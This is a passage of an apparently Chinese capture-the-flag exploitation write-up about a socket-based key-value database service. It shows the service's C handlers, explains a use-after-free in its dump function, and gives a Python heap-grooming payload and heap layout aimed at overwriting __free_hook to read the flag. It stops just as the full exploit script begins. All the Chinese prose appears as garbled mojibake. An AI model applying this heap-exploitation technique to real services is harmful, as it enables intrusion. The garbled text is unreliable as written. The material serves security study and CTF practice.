&#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ ¹æ®keyå¾—åˆ°valueçš„æ•°æ®</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_GET</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* res = <span class="built_in">get_data_item</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* return an empty type data_t */</span></span><br><span class="line">        <span class="keyword">data_t</span>* empty = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (empty) &#123;</span><br><span class="line">            empty-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="built_in">do_resp</span>(sock, empty);</span><br><span class="line">            <span class="built_in">release_data_t</span>(empty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Get Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">do_resp</span>(sock, res);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¾—åˆ°æ•´ä¸ªæ•°æ®åº“çš„å†…å®¹</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DUMP</span><span class="params">(<span class="keyword">int</span> sock)</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = <span class="built_in">dump_data_item</span>();</span><br><span class="line">    <span class="keyword">if</span>(!dump_array)&#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Dump Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">do_resp</span>(sock, dump_array);</span><br><span class="line">    <span class="built_in">release_data_t</span>(dump_array);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­addå‡½æ•°æ˜¯æ¥æ”¶ä¸€ä¸ªkeyå’Œvalueç„¶åæ”¾å…¥databaseä¸­ï¼Œdelå‡½æ•°å°±æ˜¯æ ¹æ®keyåˆ é™¤ä¸€å¯¹é”®å€¼å¯¹ï¼Œgetå°±æ˜¯æ ¹æ®keyå‘ç”¨æˆ·å‘é€å¯¹åº”çš„value,rnmå°±æ˜¯é‡å†™ä¸€ä¸ªkey,mdfå°±æ˜¯æ ¹æ®ä¸€ä¸ªkeyé‡å†™ä¸€ä¸ªvalueï¼Œdumpå°±æ˜¯æŠŠæ•°æ®åº“é‡Œçš„æ‰€æœ‰æ•°æ®å…¨éƒ½å‘é€ç»™ç”¨æˆ·</p>
<p>å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°å¦‚ä¸‹,å°±æ˜¯æ ¹æ®ä¸åŒçš„typeåˆ›å»ºä¸åŒçš„<code>data_t</code>ï¼Œå®¡å®Œå‘ç°éå¸¸å®‰å…¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">read_data_t</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">do_read_data_t</span>(sock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">do_read_data_t</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    uint16 type_be;</span><br><span class="line">    uint16 type_le;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new data_t obj */</span></span><br><span class="line">    <span class="keyword">data_t</span>* tmp = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (!tmp)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// integer</span></span><br><span class="line">    <span class="keyword">data_integer_t</span> integer_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// float</span></span><br><span class="line">    <span class="keyword">data_float_t</span> float_be = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// string</span></span><br><span class="line">    uint32 str_len_be = <span class="number">0</span>;</span><br><span class="line">    uint32 str_len_le = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// array</span></span><br><span class="line">    uint32 count_be = <span class="number">0</span>;</span><br><span class="line">    uint32 count_le = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">data_t</span>* item = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    readn(sock, (<span class="keyword">char</span>*)&amp;type_be, <span class="keyword">sizeof</span>(uint16));</span><br><span class="line">    type_le = BigLittleSwap16(type_be);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type_le) &#123;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_INTEGER:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_INTEGER;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;integer_be, <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp-&gt;integer = BigLittleSwap64(integer_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Integer: \x1B[36m0x%llx\x1B[0m\n&quot;</span>, tmp-&gt;integer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_FLOAT:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_FLOAT;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;float_be, <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            *(uint64*)&amp;tmp-&gt;_float = BigLittleSwap64(*(uint64*)&amp;float_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Float: \x1B[35m%lf\x1B[0m\n&quot;</span>, tmp-&gt;_float);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_STRING:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_STRING;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;str_len_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            str_len_le = BigLittleSwap32(str_len_be);</span><br><span class="line">            tmp-&gt;str.len = str_len_le;</span><br><span class="line">            tmp-&gt;str.ptr = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(str_len_le, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!tmp-&gt;str.ptr)</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            readn(sock, tmp-&gt;str.ptr, str_len_le);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;String(%d): \x1B[32m%s\x1B[0m\n&quot;</span>, tmp-&gt;str.len, tmp-&gt;str.ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_ARRAY:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;count_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            count_le = BigLittleSwap32(count_be);</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.count = count_le;</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.items = (<span class="keyword">data_t</span>**)<span class="built_in">calloc</span>(count_le, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>*));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\x1B[107mArray[%d]\x1B[0m:\n&quot;</span>, tmp-&gt;<span class="built_in">array</span>.count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">for</span> (uint32 i = <span class="number">0</span>; i &lt; count_le; i++) &#123;</span><br><span class="line">                item = <span class="keyword">do_read_data_t</span>(sock, level + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (item == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* release all received items when error occur */</span></span><br><span class="line">                    <span class="keyword">for</span> (uint32 j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                        <span class="keyword">release_data_t</span>(tmp-&gt;<span class="built_in">array</span>.items[j]);</span><br><span class="line">                        <span class="built_in">free</span>(tmp-&gt;<span class="built_in">array</span>.items);</span><br><span class="line">                        <span class="keyword">goto</span> INVALID;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp-&gt;<span class="built_in">array</span>.items[i] = item;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_EMPTY:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Empty data_t\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            tmp-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">INVALID:</span><br><span class="line">    <span class="built_in">free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-æ¼æ´"><a href="#0x3-æ¼æ´" class="headerlink" title="0x3 æ¼æ´"></a>0x3 æ¼æ´</h3><p>æ¼æ´å°±æ˜¯å‡ºåœ¨dumpå‡½æ•°ä¸­çš„<code>dump_data_item()</code>èº«ä¸Šï¼Œä»–å¯¹æ•°æ®åº“çš„å¤åˆ¶å¹¶ä¸æ˜¯æ·±æ‹·è´ï¼Œè€Œæ˜¯ç›´æ¥æŠŠåœ°å€æ‹¿è¿‡æ¥äº†ï¼Œæœ€åè¿˜æŠŠè¿™äº›åœ°å€å…¨éƒ½é€šè¿‡<code>release_data_t()</code>å‡½æ•°é‡Šæ”¾äº†ï¼Œä½†æ˜¯è¿™äº›åœ°å€è¿˜å­˜åœ¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥å¯¼è‡´äº†<code>uaf</code>ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span> *<span class="title">dump_data_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span>(!dump_array) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    dump_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">    dump_array-&gt;array.count = database.<span class="built_in">size</span>();</span><br><span class="line">    dump_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(dump_array-&gt;array.count, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">    std::list&lt;kvpair&gt;::iterator iter;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (iter = database.<span class="built_in">begin</span>(), i = <span class="number">0</span>; iter != database.<span class="built_in">end</span>(); iter++, i++) &#123;</span><br><span class="line">        <span class="comment">/* item_array[2] = &#123;key, value&#125; */</span></span><br><span class="line">        <span class="keyword">data_t</span> *item_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">        item_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">        item_array-&gt;array.count = <span class="number">2</span>;</span><br><span class="line">        item_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(<span class="number">2</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">        item_array-&gt;array.items[<span class="number">0</span>] = iter-&gt;first.<span class="built_in">get_data_t</span>();</span><br><span class="line">        item_array-&gt;array.items[<span class="number">1</span>] = iter-&gt;second.<span class="built_in">get_data_t</span>();</span><br><span class="line">        dump_array-&gt;array.items[i] = item_array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dump_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-æ¼æ´åˆ©ç”¨"><a href="#0x4-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x4 æ¼æ´åˆ©ç”¨"></a>0x4 æ¼æ´åˆ©ç”¨</h3><p>è¿™ä¸ªç¨‹åºè§‰å¾—æœ€éš¾çš„ä¸æ˜¯å‘ç°æ¼æ´ï¼Œè€Œæ˜¯å‘ç°æ¼æ´åè¯¥å¦‚ä½•åˆ©ç”¨æ¼æ´ï¼ŒæˆåŠŸå‘ç°æ¼æ´åˆ°åˆ©ç”¨æˆåŠŸåˆèŠ±äº†ä¸€å¤©ï¼Œç”±äºkeyå’Œvalueçš„å‰å…«ä¸ªå­—èŠ‚æ”¾çš„æ˜¯ä»–çš„ç±»å‹ï¼Œå¦‚æœè¢«freeçš„è¯å°±ä¼šç ´åï¼Œä½†æ˜¯å¦‚æœå†æ¬¡è®¿é—®çš„è¯å°±è®¿é—®ä¸åˆ°äº†ï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯è®©freeæ‰çš„å †è¢«unlinkå°±å¥½äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¼šå‘ç°0x20å¤§å°çš„å †æ ¹æœ¬ä¸ä¼šunlink,æ‰€ä»¥æ²¡åŠæ³•freeå®Œä¹‹åç«‹å³ä½¿ç”¨</p>
<p>æ­£ç¡®çš„æ€è·¯å°±æ˜¯ç›´æ¥å†ç”³è¯·è¢«freeæ‰çš„å †å—ï¼Œè¿™æ ·å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—åŒºåŸŸäº†ï¼Œç„¶ååœ¨ç”³è¯·çš„æ—¶å€™ç”³è¯·stringçš„value,å°±å¯ä»¥åˆ©ç”¨stringæ§åˆ¶èŠ‚ç‚¹äº†ã€‚è¿™æ˜¯ä¸ªæ¦‚ç‡äº‹ä»¶ï¼Œå¾—å¤šæ¬¡é‡å¤çš„ç”³è¯·æ‰å¯èƒ½æˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#add_int_string</span></span><br><span class="line">payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"><span class="comment">#dump</span></span><br><span class="line">payload+=dump()</span><br><span class="line"><span class="comment">#add_string_string</span></span><br><span class="line">payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä»¥åå †å—çš„å †å æƒ…å†µæ˜¯è¿™æ ·çš„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">è¿™æ˜¯æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„å †å—çš„å12ä½</span></span><br><span class="line">1:0a0 0c0</span><br><span class="line">2:310 330</span><br><span class="line">3:4c0 4e0</span><br><span class="line">4:5d0 5f0</span><br><span class="line">5:690 6b0</span><br><span class="line">6:750 770</span><br><span class="line"><span class="meta">#</span><span class="bash">å†ç”³è¯·å</span></span><br><span class="line">0x70 string-&gt;0x80 value</span><br><span class="line">0xa0 string-&gt;310</span><br><span class="line">0xb0 string-&gt;0c0</span><br><span class="line">0xc0 value -&gt;0c0</span><br></pre></td></tr></table></figure>

<p>å¯è§æˆ‘ä»¬å¯ä»¥æ§åˆ¶3ä¸ªèŠ‚ç‚¹äº†ï¼Œåˆ©ç”¨è¿™ä¸‰ä¸ªèŠ‚ç‚¹å®Œæˆå¯¹<code>__free_hook</code>çš„æ”¹å†™ï¼Œç„¶ååå¼¹flagï¼Œå‡ºé¢˜äººè¯´ä¸è¿å¤–ç½‘ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡sokcetæŠŠflagåå¼¹å›æ¥</p>
<p>å®Œæ•´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 